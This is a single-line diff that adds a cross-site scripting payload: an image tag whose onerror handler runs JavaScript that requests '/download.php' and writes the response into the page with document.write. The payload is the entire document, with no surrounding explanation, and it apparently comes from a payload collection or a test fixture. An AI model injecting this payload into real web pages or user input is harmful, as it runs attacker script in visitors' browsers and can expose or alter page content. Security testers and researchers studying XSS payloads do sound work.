@@ -1,0 +1,1 @@
+<img src=""onerror="javascript:this.xml= new XMLHttpRequest;this.xml.onload=function(){document.write(this.responseText)};this.xml.open('GET', '/download.php');this.xml.send();console.log(this.xml);"/>
